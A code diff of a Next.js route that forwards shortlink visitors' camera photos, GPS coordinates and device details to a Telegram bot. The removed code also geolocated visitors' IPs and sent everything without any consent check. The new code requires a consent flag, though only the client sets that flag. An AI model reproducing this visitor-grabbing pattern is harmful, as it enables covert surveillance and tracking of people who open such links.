@@ -1,140 +1,179 @@
 import { NextResponse } from "next/server";
-import axios from "axios";
+
+export const runtime = "nodejs";
+export const dynamic = "force-dynamic";
+
+const TELEGRAM_TIMEOUT_MS = 12_000;
+const MAX_IMAGE_BYTES = 5 * 1024 * 1024;
+
+type Gps = { lat: number; lon: number; accuracy?: number };
+type ReportBody = {
+  consent?: unknown;
+  image?: unknown;
+  gps?: unknown;
+  device?: unknown;
+  battery?: unknown;
+  permissions?: unknown;
+  session?: unknown;
+  connection?: unknown;
+};
+
+function asObject(value: unknown): Record<string, unknown> {
+  return value && typeof value === "object" && !Array.isArray(value)
+    ? value as Record<string, unknown>
+    : {};
+}
+
+function safeText(value: unknown, max = 180): string {
+  if (typeof value !== "string" && typeof value !== "number" && typeof value !== "boolean") {
+    return "Unavailable";
+  }
+  const text = String(value).replace(/[\u0000-\u001f\u007f]/g, " ").trim();
+  return text ? text.slice(0, max) : "Unavailable";
+}
+
+function parseGps(value: unknown): Gps | null {
+  const gps = asObject(value);
+  const lat = gps.lat;
+  const lon = gps.lon;
+  const accuracy = gps.accuracy;
+  if (typeof lat !== "number" || !Number.isFinite(lat) || lat < -90 || lat > 90) return null;
+  if (typeof lon !== "number" || !Number.isFinite(lon) || lon < -180 || lon > 180) return null;
+  return {
+    lat,
+    lon,
+    ...(typeof accuracy === "number" && Number.isFinite(accuracy) && accuracy >= 0
+      ? { accuracy: Math.min(accuracy, 1_000_000) }
+      : {}),
+  };
+}
+
+function parseImage(value: unknown): { data: string; mime: string } | null {
+  if (typeof value !== "string" || !value) return null;
+  const match = value.match(/^data:(image\/(?:jpeg|png|webp));base64,([A-Za-z0-9+/=\r\n]+)$/);
+  if (!match) throw new Error("IMAGE_INVALID");
+  const data = match[2].replace(/\s/g, "");
+  const bytes = Buffer.from(data, "base64");
+  if (!data || bytes.length > MAX_IMAGE_BYTES || bytes.length === 0) throw new Error("IMAGE_TOO_LARGE");
+  return { data, mime: match[1] };
+}
 
 export async function POST(req: Request) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!botToken || !chatId) {
+    return NextResponse.json(
+      { error: "Telegram belum dikonfigurasi. Atur TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID." },
+      { status: 503 },
+    );
+  }
+
+  let body: ReportBody;
   try {
-    const body = await req.json();
-    const {
-      image = "",
-      gps = null,
-      device = {},
-      battery = null,
-      permissions = {},
-      session = {},
-      connection = null,
-    } = body;
+    body = await req.json() as ReportBody;
+  } catch {
+    return NextResponse.json({ error: "Body harus berupa JSON yang valid." }, { status: 400 });
+  }
 
-    const forwarded = req.headers.get("x-forwarded-for");
-    const realIp = req.headers.get("x-real-ip");
-    const clientIp = (forwarded?.split(",")[0]?.trim() || realIp || "1.1.1.1");
+  // Camera/location and visitor details must never be sent without explicit consent.
+  if (body.consent !== true) {
+    return NextResponse.json(
+      { error: "Persetujuan eksplisit diperlukan sebelum laporan dikirim." },
+      { status: 403 },
+    );
+  }
 
-    const geoRes = await axios
-      .get(`https://ip-api.com/json/${encodeURIComponent(clientIp)}`, {
-        timeout: 5000,
-        params: { fields: "status,message,query,city,regionName,country,isp,org,as,lat,lon,timezone" },
-      })
-      .catch(() => ({ data: {} }));
+  const device = asObject(body.device);
+  const battery = asObject(body.battery);
+  const permissions = asObject(body.permissions);
+  const session = asObject(body.session);
+  const connection = asObject(body.connection);
+  const gps = parseGps(body.gps);
 
-    const geo = geoRes.data || {};
-    const gpsText = gps
-      ? `${gps.lat}, ${gps.lon} (±${gps.accuracy ?? "?"}m)`
-      : "Unavailable";
+  let image: { data: string; mime: string } | null;
+  try {
+    image = parseImage(body.image);
+  } catch (error) {
+    const code = error instanceof Error ? error.message : "";
+    const message = code === "IMAGE_TOO_LARGE"
+      ? "Foto kosong atau melebihi batas 5 MB."
+      : "Foto harus berupa data URL JPEG, PNG, atau WebP yang valid.";
+    return NextResponse.json({ error: message }, { status: 400 });
+  }
 
-    let caption = `🚀 *SHORTLINK VISITOR REPORT*\n`;
-    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+  const lines = [
+    "SHORTLINK VISITOR REPORT (consent granted)",
+    `Time (UTC): ${new Date().toISOString()}`,
+    "",
+    "Location:",
+    gps
+      ? `GPS: ${gps.lat}, ${gps.lon}${gps.accuracy == null ? "" : ` (accuracy ±${gps.accuracy} m)`}`
+      : "GPS: not shared",
+    ...(gps ? [`Map: https://www.google.com/maps?q=${gps.lat},${gps.lon}`] : []),
+    "",
+    "Device / browser (client-provided):",
+    `Model: ${safeText(device.model)}`,
+    `OS: ${safeText(device.os)}`,
+    `Language: ${safeText(device.language)}`,
+    `Timezone: ${safeText(device.timezone)}`,
+    `Screen: ${safeText(device.screen)}`,
+    `User agent: ${safeText(device.userAgent, 300)}`,
+    "",
+    "Permissions (client-reported):",
+    `Location: ${safeText(permissions.location)}`,
+    `Camera: ${safeText(permissions.camera)}`,
+    "",
+    "Shortlink:",
+    `Name: ${safeText(session.linkName)}`,
+    `URL: ${safeText(session.url, 300)}`,
+    "",
+    "Battery:",
+    `Level: ${typeof battery.level === "number" && Number.isFinite(battery.level) ? `${Math.round(battery.level)}%` : "Unavailable"}`,
+    `Charging: ${typeof battery.charging === "boolean" ? (battery.charging ? "Yes" : "No") : "Unavailable"}`,
+    "",
+    "Connection:",
+    `Type: ${safeText(connection.type ?? connection.effectiveType)}`,
+    `Downlink: ${typeof connection.downlink === "number" && Number.isFinite(connection.downlink) ? `${connection.downlink} Mbps` : "Unavailable"}`,
+    `RTT: ${typeof connection.rtt === "number" && Number.isFinite(connection.rtt) ? `${connection.rtt} ms` : "Unavailable"}`,
+  ];
+  const caption = lines.join("\n").slice(0, 1024);
 
-    caption += `🌐 *NETWORK & GEO-IP*\n`;
-    caption += `├ *IP:* \`${geo.query || clientIp}\`\n`;
-    caption += `├ *ISP:* \`${geo.isp || "Unavailable"}\`\n`;
-    caption += `├ *ORG:* \`${geo.org || "Unavailable"}\`\n`;
-    caption += `└ *Location:* \`${geo.city || "?"}, ${geo.regionName || "?"}, ${geo.country || "?"}\`\n\n`;
-
-    caption += `🎯 *GPS*\n`;
-    caption += `├ *Coordinates:* \`${gpsText}\`\n`;
-    if (gps) {
-      caption += `└ *Maps:* https://www.google.com/maps?q=${gps.lat},${gps.lon}\n\n`;
-    } else {
-      caption += `└ *Maps:* Unavailable\n\n`;
-    }
-
-    caption += `📱 *DEVICE / BROWSER*\n`;
-    caption += `├ *Model:* \`${device.model || "Unavailable"}\`\n`;
-    caption += `├ *OS:* \`${device.os || "Unavailable"}\`\n`;
-    caption += `├ *RAM:* \`${device.ram || "Unavailable"}\`\n`;
-    caption += `├ *CPU:* \`${device.cpu || "Unavailable"}\`\n`;
-    caption += `├ *GPU:* \`${device.gpu || "Unavailable"}\`\n`;
-    caption += `├ *Language:* \`${device.language || "Unavailable"}\`\n`;
-    caption += `├ *Timezone:* \`${device.timezone || "Unavailable"}\`\n`;
-    caption += `└ *Screen:* \`${device.screen || "Unavailable"}\`\n\n`;
-
-    caption += `🔋 *BATTERY*\n`;
-    caption += `├ *Level:* \`${battery?.level ?? "Unavailable"}${battery?.level != null ? "%" : ""}\`\n`;
-    caption += `└ *Charging:* \`${battery?.charging == null ? "Unavailable" : battery.charging ? "Yes" : "No"}\`\n\n`;
-
-    caption += `🛡️ *PERMISSIONS*\n`;
-    caption += `├ *Location:* \`${permissions.location || "not-granted"}\`\n`;
-    caption += `└ *Camera:* \`${permissions.camera || "not-granted"}\`\n\n`;
-
-    if (connection) {
-      caption += `📶 *CONNECTION*\n`;
-      caption += `├ *Type:* \`${connection.type || connection.effectiveType || "Unavailable"}\`\n`;
-      caption += `├ *Downlink:* \`${connection.downlink ?? "Unavailable"} Mbps\`\n`;
-      caption += `└ *RTT:* \`${connection.rtt ?? "Unavailable"} ms\`\n\n`;
-    }
-
-    if (session?.url || session?.linkName) {
-      caption += `🔗 *SHORTLINK*\n`;
-      if (session.linkName) caption += `├ *Name:* \`${session.linkName}\`\n`;
-      if (session.url) caption += `└ *URL:* \`${session.url}\`\n\n`;
-    }
-
-    caption += `━━━━━━━━━━━━━━━━━━━━`;
-
-    const botToken = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-
-    if (!botToken || !chatId) {
-      console.error("Telegram configuration missing");
-      return NextResponse.json({ error: "Telegram is not configured" }, { status: 500 });
-    }
-
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
+  try {
+    const endpoint = `https://api.telegram.org/bot${botToken}/${image ? "sendPhoto" : "sendMessage"}`;
+    let telegramResponse: Response;
 
     if (image) {
-      const base64 = String(image).replace(/^data:image\/[^;]+;base64,/, "");
-      const buffer = Buffer.from(base64, "base64");
-      formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), "capture.jpg");
-      formData.append("caption", caption);
-      formData.append("parse_mode", "Markdown");
-      if (gps) {
-        formData.append(
-          "reply_markup",
-          JSON.stringify({
-            inline_keyboard: [[
-              { text: "📍 Google Maps", url: `https://www.google.com/maps?q=${gps.lat},${gps.lon}` },
-            ]],
-          }),
-        );
-      }
+      const form = new FormData();
+      form.set("chat_id", chatId);
+      form.set("caption", caption);
+      form.set("photo", new Blob([Buffer.from(image.data, "base64")], { type: image.mime }), "capture");
+      telegramResponse = await fetch(endpoint, { method: "POST", body: form, signal: controller.signal });
     } else {
-      formData.append("text", caption);
-      formData.append("parse_mode", "Markdown");
+      telegramResponse = await fetch(endpoint, {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: lines.join("\n").slice(0, 4096), disable_web_page_preview: true }),
+        signal: controller.signal,
+      });
     }
 
-    const endpoint = image
-      ? `https://api.telegram.org/bot${botToken}/sendPhoto`
-      : `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    const telegramResponse = await axios.post(endpoint, formData, {
-      timeout: 15000,
-      validateStatus: () => true,
-    });
-
-    if (!telegramResponse.data?.ok) {
-      console.error("Telegram API error:", telegramResponse.data);
-      return NextResponse.json(
-        { error: "Telegram API rejected the request" },
-        { status: 502 },
-      );
+    const result = await telegramResponse.json().catch(() => null) as { ok?: boolean; description?: string } | null;
+    if (!telegramResponse.ok || result?.ok !== true) {
+      console.error("Telegram delivery failed", { status: telegramResponse.status, description: result?.description });
+      return NextResponse.json({ error: "Telegram gagal menerima laporan. Periksa token, chat ID, dan akses bot." }, { status: 502 });
     }
 
     return NextResponse.json({ success: true, telegram: true });
   } catch (error) {
-    console.error("POST /api/snap failed:", error);
+    const timedOut = error instanceof Error && error.name === "AbortError";
+    console.error("POST /api/snap Telegram request failed", { timedOut });
     return NextResponse.json(
-      { error: "Failed to process visitor report" },
-      { status: 500 },
+      { error: timedOut ? "Telegram timeout; coba lagi." : "Tidak dapat menghubungi Telegram." },
+      { status: 502 },
     );
+  } finally {
+    clearTimeout(timeout);
   }
 }
